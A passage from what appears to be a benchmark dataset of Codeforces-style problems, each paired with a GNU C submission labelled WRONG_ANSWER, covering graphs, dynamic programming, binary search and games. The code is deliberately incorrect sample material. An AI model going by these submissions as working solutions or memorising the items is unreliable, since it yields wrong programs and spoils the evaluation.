|i\u2009-\u2009j|\u2009=\u2009di, where di is a favourite number of i-th cell. Cells make moves in any order, the number of moves is unlimited.The favourite number of each cell will be given to you. You will also be given a permutation of numbers from 1 to n. You are to determine whether the game could move to this state.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of cells in the array. The second line contains n distinct integers from 1 to n \u2014 permutation. The last line contains n integers from 1 to n \u2014 favourite numbers of the cells.","output_spec":"If the given state is reachable in the described game, output YES, otherwise NO.","notes":null,"sample_inputs":["5\n5 4 3 2 1\n1 1 1 1 1","7\n4 3 5 1 2 7 6\n4 6 6 1 6 6 1","7\n4 2 5 1 3 7 6\n4 6 6 1 6 6 1"],"sample_outputs":["YES","NO","YES"]}
{"difficulty":1600,"lang":"GNU C","lang_cluster":"c","src_uid":"c761bb69cf1b5a3dbe38d9f5c46e9007","submission_id":"re_1361","tags":["data structures","constructive algorithms","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint intcmp(int *a, int *b) {\n  return *a - *b;\n}\n\n#define N 100001\n\nint n, m;\nint a[N];\nint c[N][2];\nint suspects[N], k;\n\nint main() {\n  int i, no, x;\n  while (scanf(\"%d %d\", &n, &m) != EOF) {\n    no = 0;\n    memset(c, 0, sizeof c);\n    for (i = 1; i <= n; i++) {\n      scanf(\"%d\", &a[i]);\n      if (a[i] > 0) {\n        c[a[i]][1]++;\n      } else {\n        c[-a[i]][0]++;\n        no++;\n      }\n    }\n    k = 0;\n    for (i = 1; i <= n; i++)\n      if (c[i][1] + no - c[i][0] == m)\n        suspects[k++] = i;\n    qsort(suspects, k, sizeof(int), (__compar_fn_t)intcmp);\n    for (i = 1; i <= n; i++) {\n      if (a[i] > 0) {\n        x = a[i];\n        if (k == 1 && suspects[0] == x)\n          puts(\"Truth\");\n        else if (!bsearch(&x, suspects, k, sizeof(int), (__compar_fn_t)intcmp))\n          puts(\"Lie\");\n        else\n          puts(\"Not defined\");\n      } else {\n        x = -a[i];\n        if (k == 1 && suspects[0] == x)\n          puts(\"Lie\");\n        else if (!bsearch(&x, suspects, k, sizeof(int), (__compar_fn_t)intcmp))\n          puts(\"Truth\");\n        else\n          puts(\"Not defined\");\n      }\n    }\n  }\n  return 0;\n}\n","description":"As Sherlock Holmes was investigating a crime, he identified n suspects. He knows for sure that exactly one of them committed the crime. To find out which one did it, the detective lines up the suspects and numbered them from 1 to n. After that, he asked each one: \"Which one committed the crime?\". Suspect number i answered either \"The crime was committed by suspect number ai\", or \"Suspect number ai didn't commit the crime\". Also, the suspect could say so about himself (ai\u2009=\u2009i).Sherlock Holmes understood for sure that exactly m answers were the truth and all other answers were a lie. Now help him understand this: which suspect lied and which one told the truth?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009n) \u2014 the total number of suspects and the number of suspects who told the truth. Next n lines contain the suspects' answers. The i-th line contains either \"+ai\" (without the quotes), if the suspect number i says that the crime was committed by suspect number ai, or \"-ai\" (without the quotes), if the suspect number i says that the suspect number ai didn't commit the crime (ai is an integer, 1\u2009\u2264\u2009ai\u2009\u2264\u2009n). It is guaranteed that at least one suspect exists, such that if he committed the crime, then exactly m people told the truth.","output_spec":"Print n lines. Line number i should contain \"Truth\" if suspect number i has told the truth for sure. Print \"Lie\" if the suspect number i lied for sure and print \"Not defined\" if he could lie and could tell the truth, too, depending on who committed the crime.","notes":"NoteThe first sample has the single person and he confesses to the crime, and Sherlock Holmes knows that one person is telling the truth. That means that this person is telling the truth.In the second sample there are three suspects and each one denies his guilt. Sherlock Holmes knows that only two of them are telling the truth. Any one of them can be the criminal, so we don't know for any of them, whether this person is telling the truth or not.In the third sample the second and the fourth suspect defend the first and the third one. But only one is telling the truth, thus, the first or the third one is the criminal. Both of them can be criminals, so the second and the fourth one can either be lying or telling the truth. The first and the third one are lying for sure as they are blaming the second and the fourth one.","sample_inputs":["1 1\n+1","3 2\n-1\n-2\n-3","4 1\n+2\n-3\n+4\n-1"],"sample_outputs":["Truth","Not defined\nNot defined\nNot defined","Lie\nNot defined\nLie\nNot defined"]}
{"difficulty":2600,"lang":"GNU C","lang_cluster":"c","src_uid":"c7e0c6b93a2f2f43fe9da405409c91e6","submission_id":"re_1107","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\n#include <string.h>\n#include <math.h>\n#include <float.h>\n\n\/*---*\/\n\n#define FOR(i, b, e)\tfor(i = (b); i <= (e); i++)\n#define FORL(i, b, e)\tfor(i = (b); i < (e); i++)\n#define FORD(i, e, b)\tfor(i = (e); i >= (b); i--)\n#define FOR0(i, e)\t\tFORL(i, 0, e)\n\n#define min(a, b)\t\t(((a) < (b)) ? (a) : (b))\n#define max(a, b)\t\t(((a) > (b)) ? (a) : (b))\n#define MINA(a, b)\t\tdo { if ((a) > (b)) (a) = (b); } while(0)\n#define MAXA(a, b)\t\tdo { if ((a) < (b)) (a) = (b); } while(0)\n#define MINA2(a, b, i, j)\t\tdo { if ((a) > (b)) { (a) = (b); (i) = (j); } } while(0)\n#define MAXA2(a, b, i, j)\t\tdo { if ((a) < (b)) { (a) = (b); (i) = (j); } } while(0)\n\n#define SWAP(a, b)\t\tdo { int _t = a; a = b; b = _t; } while(0)\n#define SWAPT(a, b, t)\tdo { t _t = a; a = b; b = _t; } while(0)\n#define sqr(a)\t\t\t((a) * (a))\n\n#define INT int\n\n#define INT_CAP 0x3F3F3F3F\n\n\/*---*\/\n\n#define NMAX\t4096\n\nchar a[NMAX], b[NMAX];\nINT vv[NMAX][NMAX];\nint lasta[256], lastb[256];\n\nint tr, td, ti, te;\n\nint editdistance(int n1, int n2)\n{\n\tint i1, i2, la, lb;\n\tINT m;\n\tFOR(i2, 0, n2)\n\t\tvv[0][i2] = i2 * ti;\n\tmemset(lasta, 0xFF, sizeof(lasta));\n\tFOR(i1, 1, n1) {\n\t\tvv[i1][0] = i1 * td;\n\t\tmemset(lastb, 0xFF, sizeof(lastb));\n\t\tFOR(i2, 1, n2) {\n\t\t\tif (a[i1 - 1] == b[i2 - 1])\n\t\t\t\tm = vv[i1-1][i2-1];\n\t\t\telse \n\t\t\t\tm = vv[i1-1][i2-1] + tr;\n\t\t\tMINA(m, vv[i1-1][i2] + td);\n\t\t\tMINA(m, vv[i1][i2-1] + ti);\n\t\t\tlb = lastb[a[i1 - 1]];\n\t\t\tla = lasta[b[i2 - 1]];\n\t\t\tif (la >= 0 && lb >= 0)\n\t\t\t\tMINA(m, vv[la][lb] + te + (i2 - lb - 2) * ti + (i1 - la - 2) * ti);\n\t\t\tvv[i1][i2] = m;\n\t\t\tlastb[b[i2 - 1]] = i2 - 1;\n\t\t}\n\t\tlasta[a[i1 - 1]] = i1 - 1;\n\t}\n\treturn vv[n1][n2];\n}\n\nint main()\n{\n\tint la, lb;\n#ifndef ONLINE_JUDGE\nchar ss[1024];\nint cc;\n#endif\n#ifndef ONLINE_JUDGE\nwhile((cc = getchar()) != EOF) {\n\tungetc(cc, stdin);\n#endif\n\tscanf(\"%d %d %d %d\\n\", &ti, &td, &tr, &te);\n\tgets(a);\n\tgets(b);\n\tla = strlen(a);\n\tlb = strlen(b);\n\tprintf(\"%d\\n\", editdistance(la, lb));\n#ifndef ONLINE_JUDGE\n\tprintf(\"\\n\");\n}\n#endif\n\treturn 0;\n}\n\n","description":"You are given a sequence of balls A by your teacher, each labeled with a lowercase Latin letter 'a'-'z'. You don't like the given sequence. You want to change it into a new sequence, B that suits you better. So, you allow yourself four operations:  You can insert any ball with any label into the sequence at any position.  You can delete (remove) any ball from any position.  You can replace any ball with any other ball.  You can exchange (swap) two adjacent balls. Your teacher now places time constraints on each operation, meaning that an operation can only be performed in certain time. So, the first operation takes time ti, the second one takes td, the third one takes tr and the fourth one takes te. Also, it is given that 2\u00b7te\u2009\u2265\u2009ti\u2009+\u2009td.Find the minimal time to convert the sequence A to the sequence B.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers ti,\u2009td,\u2009tr,\u2009te (0\u2009&lt;\u2009ti,\u2009td,\u2009tr,\u2009te\u2009\u2264\u2009100). The following two lines contain sequences A and B on separate lines. The length of each line is between 1 and 4000 characters inclusive.","output_spec":"Print a single integer representing minimum time to convert A into B.","notes":"NoteIn the second sample, you could delete the ball labeled 'a' from the first position and then insert another 'a' at the new second position with total time 6. However exchanging the balls give total time 3.","sample_inputs":["1 1 1 1\nyoushouldnot\nthoushaltnot","2 4 10 3\nab\nba","1 10 20 30\na\nza"],"sample_outputs":["5","3","1"]}
{"difficulty":1700,"lang":"GNU C11","lang_cluster":"c","src_uid":"cb47d710361979de0f975cc34fc22c7a","submission_id":"re_1191","tags":["dp","binary search","data structures"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<string.h>\n#define mo 1000000007\n#define MAX_M 100300\nint C[MAX_M*2]={0};\nint q[MAX_M*2]={0};\nint m,n;\nint e[MAX_M*2]={0};\nint s[MAX_M],t[MAX_M];\nint  lowbit(int x)\n{\n\n\treturn (x&(x^(x-1)));\n}\nint getsum(int x)\n{\n\n\tint sum=0;\n    while (x>0)\n\t{\n       sum=(sum+C[x]%mo)%mo;\n\/\/\t   printf(\"\/\/X:%d\\n C:%d\\n\",x,C[x]);\n\t   x-=lowbit(x);\n\t}\n\treturn sum;\n}\nint add(int x,int d)\n{ \n  while (x<=e[0])\n  {\n\t  \n      C[x]=(C[x]+d)%mo;\n\t  \n\t  x+=lowbit(x);\n  }\n\n   return 0;\n\n}\n\nint qsort(int l ,int r)\n{\n\n\n\tint  x,temp,i,j;\n    x=q[(l+r)\/2];\n\ti=l;\n\tj=r;\n\n    while(i<=j)\n    {\n\n\t\twhile(q[i]<x) i++;\n\t\twhile(q[j]>x) j--;\n\t\tif (i<=j)\n\t\t{\n            temp=q[i];\n\t\t\tq[i]=q[j];\n\t\t\tq[j]=temp;\n\t\t\ti++;\n\t\t\tj--;\n\t\t}\n\t}\n\tif (i<r) qsort(i,r);\n\tif (l<j) qsort(l,j);\n\treturn 0;\n    \n}\nint sort(int l,int r)\n{\n    int i,j,temp,x;\n\ti=l;\n\tj=r;\n\tx=t[(i+j)\/2];\n\twhile (i<=j)\n\t{\n\n\t\twhile (t[i]<x)i++;\n\t\twhile (t[j]>x)j--;\n\t\tif (i<=j)\n\t\t{\n\t\t\ttemp=t[i];\n\t\t\tt[i]=t[j];\n\t\t\tt[j]=temp;\n\t\t\ttemp=s[i];\n\t\t\ts[i]=s[j];\n\t\t\ts[j]=temp;\n            i++;\n\t\t\tj--;\n\n\t\t}\n\t}\n  \tif (i<r) sort(i,r);\n\tif (l<j) sort(l,j);\n\treturn 0;\n}\n\/\/==================== \ufffd\ufffd\ufffd==\nint serch(int x)\n{\n   int l,r,mid;\n   l=1;\n   r=e[0];\n   mid=(r+l)\/2;\n   while (r>=l)\n   { \n\t  \/\/printf(\"%d %d \\n\",l,r);\n      mid=(r+l)\/2;\n\t  if (e[mid]==x) return  mid;\n\t  if (x>e[mid]) l=mid+1;\n\t  else  r=mid-1;         \n   }\n   return mid;\n\n\n}\nint main()\n{\n\/\/  int F[50004];\n  \n  int tot;\n  int ans=0;\n  int i;\n  int F,tt,ss,S1,S2;\n  scanf(\"%d %d\",&n,&m);\n  tot=1;\n  q[tot]=++n;\n  q[++tot]=1;\n  for (i=1;i<=m;i++) \n  {\n\t  scanf(\"%d %d\",&s[i],&t[i]);\n\t  q[++tot]=++s[i];\n\t  q[++tot]=++t[i];\n  }\n  \/\/=====\ufffd\ufffd\u0262\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd=====\n  \/\/==\n \/\/ for (i=1;i<=tot;i++) printf(\"%d \",q[i]);printf(\"\\n\");\n\n  qsort(1,tot);\n \n  \/\/========================\n  \/\/for (i=1;i<=tot;i++) printf(\"%d \",q[i]);printf(\"\\n\");\n  e[0]=1;\n  e[e[0]]=q[1];\n  for (i=2;i<=tot;i++)\n\t  if(e[e[0]]!=q[i])\n\t  {\n\t\t  e[0]++;\n\t\t  e[e[0]]=q[i];\n\t  }\n  \/\/========================\n  \/\/for (i=1;i<=e[0];i++) e[i]++;\n  \/\/for (i=1;i<=e[0];i++) printf(\"%d \",e[i]);printf(\"\\n\");\n  add(1,1);\n \/\/ printf(\"%d\\n\",m);\n  \/\/ printf(\"%d\\n\",getsum(1));\n  sort(1,m);\/\/\ufffd\ufffd\ufffd\ufffd\ufffd\u0575\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n \/\/ printf(\"ok\");\n   \/\/ for (i=1;i<=m;i++) printf(\"%d %d\\n\" ,s[i],t[i]);\n  for (i=1;i<=m;i++)\n  {\n\t  ss=serch(s[i]);\n\t \/\/ printf(\"%d ss:%d \",i,ss);\n\t  tt=serch(t[i]);\n\t \/\/ printf(\"tt:%d \\n\",tt);\n\t  F=0;\n\t  if (ss>1 )S1=getsum(ss-1);else  S1=0;\n\t  S2=getsum(tt-1);\n\t  F=((S2-S1)+mo)%mo;\n\t  add(tt,F);\n  }\n  tt=serch(n);\n \/\/ printf(\"%d\\n\",tt);\n  ans=getsum(tt)-getsum(tt-1);\n  printf(\"%d\",ans);\n  return 0;\n\n}","description":"Little boy Gerald studies at school which is quite far from his house. That's why he has to go there by bus every day. The way from home to school is represented by a segment of a straight line; the segment contains exactly n\u2009+\u20091 bus stops. All of them are numbered with integers from 0 to n in the order in which they follow from Gerald's home. The bus stop by Gerald's home has number 0 and the bus stop by the school has number n.There are m buses running between the house and the school: the i-th bus goes from stop si to ti (si\u2009&lt;\u2009ti), visiting all the intermediate stops in the order in which they follow on the segment. Besides, Gerald's no idiot and he wouldn't get off the bus until it is still possible to ride on it closer to the school (obviously, getting off would be completely pointless). In other words, Gerald can get on the i-th bus on any stop numbered from si to ti\u2009-\u20091 inclusive, but he can get off the i-th bus only on the bus stop ti.Gerald can't walk between the bus stops and he also can't move in the direction from the school to the house.Gerald wants to know how many ways he has to get from home to school. Tell him this number. Two ways are considered different if Gerald crosses some segment between the stops on different buses. As the number of ways can be too much, find the remainder of a division of this number by 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009109,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009105). Then follow m lines each containing two integers si,\u2009ti. They are the numbers of starting stops and end stops of the buses (0\u2009\u2264\u2009si\u2009&lt;\u2009ti\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the number of ways to get to the school modulo 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test has the only variant to get to school: first on bus number one to the bus stop number one; then on bus number two to the bus stop number two.In the second test no bus goes to the third bus stop, where the school is positioned. Thus, the correct answer is 0.In the third test Gerald can either get or not on any of the first four buses to get closer to the school. Thus, the correct answer is 24\u2009=\u200916.","sample_inputs":["2 2\n0 1\n1 2","3 2\n0 1\n1 2","5 5\n0 1\n0 2\n0 3\n0 4\n0 5"],"sample_outputs":["1","0","16"]}
{"difficulty":2200,"lang":"GNU C","lang_cluster":"c","src_uid":"ce5cc8512359701696dba1b254c6afda","submission_id":"re_1229","tags":["dp","bitmasks","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n\n#define N\t19\n\nint bcnt(int x) {\n\treturn x == 0 ? 0 : bcnt(x & (x - 1)) + 1;\n}\n\nint main() {\n\tstatic int adj[N][N], dp[1 << N][N];\n\tint n, m, i_, h, i, j, v, cnt;\n\n\tscanf(\"%d%d\", &n, &m);\n\twhile (m-- > 0) {\n\t\tscanf(\"%d%d\", &i, &j);\n\t\ti--, j--;\n\t\tadj[i][j] = adj[j][i] = 1;\n\t}\n\tcnt = 0;\n\tfor (i_ = 0; i_ < n; i_++) {\n\t\tfor (v = 1 << (i_ + 1); v < 1 << n; v += 1 << (i_ + 1))\n\t\t\tfor (i = i_ + 1; i < n; i++)\n\t\t\t\tdp[v][i] = 0;\n\t\tfor (i = i_ + 1; i < n; i++)\n\t\t\tif (adj[i_][i])\n\t\t\t\tdp[1 << i][i] = 1;\n\t\tfor (h = 1; h <= n - i_ - 1; h++)\n\t\t\tfor (v = 1 << (i_ + 1); v < 1 << n; v += 1 << (i_ + 1))\n\t\t\t\tif (bcnt(v) == h)\n\t\t\t\t\tfor (i = i_ + 1; i < n; i++)\n\t\t\t\t\t\tfor (j = i_ + 1; j < n; j++)\n\t\t\t\t\t\t\tif ((v & 1 << j) == 0 && adj[i][j])\n\t\t\t\t\t\t\t\tdp[v | (1 << j)][j] += dp[v][i];\n\t\tfor (v = 1 << (i_ + 1); v < 1 << n; v += 1 << (i_ + 1))\n\t\t\tif (bcnt(v) > 1)\n\t\t\t\tfor (i = i_ + 1; i < n; i++)\n\t\t\t\t\tif ((v & 1 << i) > 0 && adj[i_][i])\n\t\t\t\t\t\tcnt += dp[v][i];\n\t}\n\tprintf(\"%d\\n\", cnt \/ 2);\n\treturn 0;\n}\n","description":"Given a simple graph, output the number of simple cycles in it. A simple cycle is a cycle with no repeated vertices or edges.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u200919, 0\u2009\u2264\u2009m) \u2013 respectively the number of vertices and edges of the graph. Each of the subsequent m lines contains two integers a and b, (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n, a\u2009\u2260\u2009b) indicating that vertices a and b are connected by an undirected edge. There is no more than one edge connecting any pair of vertices.","output_spec":"Output the number of cycles in the given graph.","notes":"NoteThe example graph is a clique and contains four cycles of length 3 and three cycles of length 4.","sample_inputs":["4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4"],"sample_outputs":["7"]}
{"difficulty":1700,"lang":"GNU C","lang_cluster":"c","src_uid":"d5fbb3033bd7508fd468edb9bb995d6c","submission_id":"re_266","tags":["data structures","binary search","graphs","shortest paths"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <string.h>\n#define QLEN 100007\nint n,m;\nint e[200010][2],v[200010],p[100010];\nint bgn[100010],len[100010],ban[100010],go[100010];\nint q[100010],dis[100010];\nshort vis[100010];\nvoid adde(int sn,int fn,int val,int id)\n{\n\te[id][0] = fn; e[id][1] = p[sn]; p[sn] = id; v[id] = val;\n}\nint calc(int sn,int tim)\n{\n\tint head = bgn[sn],tail = bgn[sn]+len[sn]-1,mid;\n\tif(!len[sn]) return tim;\n\twhile(head<tail)\n\t{\n\t\tmid = (head+tail)>>1;\n\t\tif(ban[mid]>=tim) tail = mid;\n\t\telse head = mid+1;\n\t}\n\tif(ban[head] != tim) return tim;\n\telse return go[head];\n}\nvoid spfa()\n{\n\tint i,sn,fn,val;\n\tint head = 1,tail = 2;\n\tmemset(dis,60,sizeof(dis));\n\tq[1] = 1; dis[1] = 0; vis[1] = 1;\n\twhile(head != tail)\n\t{\n\t\tsn = q[head++];\n\t\tfor(i=p[sn];i;i=e[i][1])\n\t\t{\n\t\t\tfn = e[i][0];\n\t\t\tval = calc(sn,dis[sn])+v[i];\n\t\t\tif(dis[fn]<=val) continue;\n\t\t\tdis[fn] = val;\n\t\t\tif(vis[fn]) continue;\n\t\t\tvis[fn] = 1; q[tail++] = fn;\n\t\t\tif(tail>QLEN) tail = 1;\n\t\t}\n\t\tif(head>QLEN) head = 1;\n\t}\n}\nint main()\n{\n\tint i,j,sn,fn,val;\n\tscanf(\"%d%d\",&n,&m);\n\tfor(i=1;i<=m;i++)\n\t{\n\t\tscanf(\"%d%d%d\",&sn,&fn,&val);\n\t\tadde(sn,fn,val,i<<1);\n\t\tadde(fn,sn,val,i<<1|1);\n\t}\n\tbgn[0] = 1;\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tscanf(\"%d\",&len[i]);\n\t\tbgn[i] = bgn[i-1]+len[i-1];\n\t\tfor(j=bgn[i];j<bgn[i]+len[i];j++) scanf(\"%d\",&ban[j]);\n\t\tgo[j-1] = ban[j-1]+1;\n\t\tfor(j-=2;j>=bgn[i];j--) \n\t\t{\n\t\t\tif(ban[j] == ban[j+1]-1) go[j] = go[j+1];\n\t\t\telse go[j] = ban[j]+1;\n\t\t}\n\t}\n\tspfa();\n\tprintf(\"%d\",dis[n]<dis[0]?dis[n]:-1);\n\treturn 0;\n}","description":"Goa'uld Apophis captured Jack O'Neill's team again! Jack himself was able to escape, but by that time Apophis's ship had already jumped to hyperspace. But Jack knows on what planet will Apophis land. In order to save his friends, Jack must repeatedly go through stargates to get to this planet.Overall the galaxy has n planets, indexed with numbers from 1 to n. Jack is on the planet with index 1, and Apophis will land on the planet with index n. Jack can move between some pairs of planets through stargates (he can move in both directions); the transfer takes a positive, and, perhaps, for different pairs of planets unequal number of seconds. Jack begins his journey at time 0.It can be that other travellers are arriving to the planet where Jack is currently located. In this case, Jack has to wait for exactly 1 second before he can use the stargate. That is, if at time t another traveller arrives to the planet, Jack can only pass through the stargate at time t\u2009+\u20091, unless there are more travellers arriving at time t\u2009+\u20091 to the same planet.Knowing the information about travel times between the planets, and the times when Jack would not be able to use the stargate on particular planets, determine the minimum time in which he can get to the planet with index n.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n (2\u2009\u2264\u2009n\u2009\u2264\u2009105), the number of planets in the galaxy, and m (0\u2009\u2264\u2009m\u2009\u2264\u2009105) \u2014 the number of pairs of planets between which Jack can travel using stargates. Then m lines follow, containing three integers each: the i-th line contains numbers of planets ai and bi (1\u2009\u2264\u2009ai,\u2009bi\u2009\u2264\u2009n, ai\u2009\u2260\u2009bi), which are connected through stargates, and the integer transfer time (in seconds) ci (1\u2009\u2264\u2009ci\u2009\u2264\u2009104) between these planets. It is guaranteed that between any pair of planets there is at most one stargate connection. Then n lines follow: the i-th line contains an integer ki (0\u2009\u2264\u2009ki\u2009\u2264\u2009105) that denotes the number of moments of time when other travellers arrive to the planet with index i. Then ki distinct space-separated integers tij (0\u2009\u2264\u2009tij\u2009&lt;\u2009109) follow, sorted in ascending order. An integer tij means that at time tij (in seconds) another traveller arrives to the planet i. It is guaranteed that the sum of all ki does not exceed 105.","output_spec":"Print a single number \u2014 the least amount of time Jack needs to get from planet 1 to planet n. If Jack can't get to planet n in any amount of time, print number -1.","notes":"NoteIn the first sample Jack has three ways to go from planet 1. If he moves to planet 4 at once, he spends 8 seconds. If he transfers to planet 3, he spends 3 seconds, but as other travellers arrive to planet 3 at time 3 and 4, he can travel to planet 4 only at time 5, thus spending 8 seconds in total. But if Jack moves to planet 2, and then \u2014 to planet 4, then he spends a total of only 2\u2009+\u20095\u2009=\u20097 seconds.In the second sample one can't get from planet 1 to planet 3 by moving through stargates.","sample_inputs":["4 6\n1 2 2\n1 3 3\n1 4 8\n2 3 4\n2 4 5\n3 4 3\n0\n1 3\n2 3 4\n0","3 1\n1 2 3\n0\n1 3\n0"],"sample_outputs":["7","-1"]}
{"difficulty":2000,"lang":"GNU C11","lang_cluster":"c","src_uid":"e33b0a752dc1aba25da21e20435e3fe2","submission_id":"re_1263","tags":["binary search","*special"],"exec_outcome":"WRONG_ANSWER","source_code":"\n#include <stdio.h>\n\n#define M 1000000\n\ntypedef int bool;\n#define true 1\n#define false 0\n\nint n,k;\nchar str[M];\nint v[M];\n\nbool check(int d);\nint bs(int l,int r);\n\n\nint main(){\n    scanf(\"%d %d\", &n, &k);\n    char ch;\n    for(int i=0;i<n;++i){\n        scanf(\" %c\",&ch);\n        str[i] = ch;\n    }\n\n    for(int i = 0;i < n; ++i){\n        if(str[i] == '0'){\n            v[i] = i;\n        } else {\n            v[i] = v[i-1];\n        }\n    }\n\n    int ans = bs(0,n-2);\n\n    printf(\"%d\",ans);\n}\n\n\nbool check(int d){\n    int s = 0;\n    int kk = 0;\n    while(true){\n        if(s + d + 1 >= n - 1){\n            break;\n        }\n        if(kk == k - 2){\n            return false;\n        }\n        if(v[s + d + 1] <= s){\n            return false;\n        } else{\n            s = v[s + d + 1];\n        }\n        kk++;\n    }\n    true;\n}\n\n\nint bs(int l,int r){\n    while(l + 1 < r){\n        int m = (l + r) \/ 2;\n        if(check(m)){\n            r = m;\n        } else{\n            l = m;\n        }\n    }\n    if(check(l)){\n        return l;\n    } else{\n        return r;\n    }\n}","description":"Polycarp's workday lasts exactly $$$n$$$ minutes. He loves chocolate bars and can eat one bar in one minute. Today Polycarp has $$$k$$$ bars at the beginning of the workday.In some minutes of the workday Polycarp has important things to do and in such minutes he is not able to eat a chocolate bar. In other minutes he can either eat or not eat one chocolate bar. It is guaranteed, that in the first and in the last minutes of the workday Polycarp has no important things to do and he will always eat bars in this minutes to gladden himself at the begining and at the end of the workday. Also it is guaranteed, that $$$k$$$ is strictly greater than $$$1$$$.Your task is to determine such an order of eating chocolate bars that the maximum break time between eating bars is as minimum as possible.Consider that Polycarp eats a bar in the minute $$$x$$$ and the next bar in the minute $$$y$$$ ($$$x &lt; y$$$). Then the break time is equal to $$$y - x - 1$$$ minutes. It is not necessary for Polycarp to eat all bars he has.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$2 \\le n \\le 200\\,000$$$, $$$2 \\le k \\le n$$$) \u2014 the length of the workday in minutes and the number of chocolate bars, which Polycarp has in the beginning of the workday. The second line contains the string with length $$$n$$$ consisting of zeros and ones. If the $$$i$$$-th symbol in the string equals to zero, Polycarp has no important things to do in the minute $$$i$$$ and he can eat a chocolate bar. In the other case, Polycarp is busy in the minute $$$i$$$ and can not eat a chocolate bar. It is guaranteed, that the first and the last characters of the string are equal to zero, and Polycarp always eats chocolate bars in these minutes.","output_spec":"Print the minimum possible break in minutes between eating chocolate bars.","notes":"NoteIn the first example Polycarp can not eat the chocolate bar in the second minute, so the time of the break equals to one minute.In the second example Polycarp will eat bars in the minutes $$$1$$$ and $$$8$$$ anyway, also he needs to eat the chocolate bar in the minute $$$5$$$, so that the time of the maximum break will be equal to $$$3$$$ minutes.","sample_inputs":["3 3\n010","8 3\n01010110"],"sample_outputs":["1","3"]}
{"difficulty":2500,"lang":"GNU C","lang_cluster":"c","src_uid":"f6380129212b575b1a5e9861565a511a","submission_id":"re_937","tags":["dp","games"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <string.h>\nint n,m,an = 0,am = 0,bn = 0,bm = 0;\nint sga[25][25][25][25],sgb[25][25][25][25];\nchar map[25][25];\nshort ga[25][25],gb[25][25];\nint max(int a,int b)\n{\n    return a>b?a:b;\n}\nint worka(int i,int j,int ii,int jj)\n{\n    int fi,fj;\n    short v[700] = {0};\n    \n    if(i>ii||j>jj||i<=0||j<=0||ii<=0||jj<=0||i>an||j>am||ii>an||jj>am) return 0;\n    if(sga[i][j][ii][jj]>=0) return sga[i][j][ii][jj];\n    \n    for(fi=i;fi<=ii;fi++) for(fj=j;fj<=jj;fj++)\n    {\n        if(ga[fi][fj] == 1)\n            v[worka(i,j,ii,fj-1)^worka(i,fj+1,ii,jj)] = 1;\n        else if(ga[fi][fj] == 2)\n            v[worka(i,j,fi-1,jj)^worka(fi+1,j,ii,jj)] = 1;\n        else if(ga[fi][fj] == 3)\n            v[worka(i,j,fi-1,fj-1)^worka(i,fj+1,fi-1,jj)^worka(fi+1,j,ii,fj-1)^worka(fi+1,fj+1,ii,jj)] = 1;\n    }\n    for(fi=0;v[fi];fi++);\n    return sga[i][j][ii][jj] = fi;\n}\nint workb(int i,int j,int ii,int jj)\n{\n    int fi,fj;\n    short v[700] = {0};\n    \n    if(i>ii||j>jj||i<=0||j<=0||ii<=0||jj<=0||i>bn||j>bm||ii>bn||jj>bm) return 0;\n    if(sgb[i][j][ii][jj]>=0) return sgb[i][j][ii][jj];\n    \n    for(fi=i;fi<=ii;fi++) for(fj=j;fj<=jj;fj++)\n    {\n        if(gb[fi][fj] == 1)\n            v[workb(i,j,ii,fj-1)^workb(i,fj+1,ii,jj)] = 1;\n        else if(gb[fi][fj] == 2)\n            v[workb(i,j,fi-1,jj)^workb(fi+1,j,ii,jj)] = 1;\n        else if(gb[fi][fj] == 3)\n            v[workb(i,j,fi-1,fj-1)^workb(i,fj+1,fi-1,jj)^workb(fi+1,j,ii,fj-1)^workb(fi+1,fj+1,ii,jj)] = 1;\n    }\n    for(fi=0;v[fi];fi++);\n    return sgb[i][j][ii][jj] = fi;\n}\nint main()\n{\n    int i,j,k,l,ii,jj,fi,fj,t1,t2;\n    memset(sga,-1,sizeof(sga)); memset(sgb,-1,sizeof(sgb));\n    scanf(\"%d%d\",&n,&m);\n    for(i=1;i<=n;i++) scanf(\"%s\",map[i]+1);\n    \n    for(i=n;i;i--) for(j=1;j<=m;j++)\n    {\n        ii = (i+j-2)\/2+1;\n        jj = ((j-i)-(1-n))\/2+1;\n        if(((i+j)&1) == ((n+1)&1))\n        {\n            if(map[i][j] == 'L') ga[ii][jj] = 1;\n            else if(map[i][j] == 'R') ga[ii][jj] = 2;\n            else ga[ii][jj] = 3;\n            an = max(an,ii); am = max(am,jj);\n        }\n        else\n        {\n            if(map[i][j] == 'L') gb[ii][jj] = 1;\n            else if(map[i][j] == 'R') gb[ii][jj] = 2;\n            else gb[ii][jj] = 3;\n            bn = max(bn,ii); bm = max(bm,jj);\n        }\n    }\n    if(worka(1,1,an,am)^workb(1,1,bn,bm)) printf(\"WIN\");\n    else printf(\"LOSE\");\n    \n    return 0;\n}","description":"Recently Roma has become the happy owner of a new game World of Darkraft. This game combines elements of virtually all known genres, and on one of the 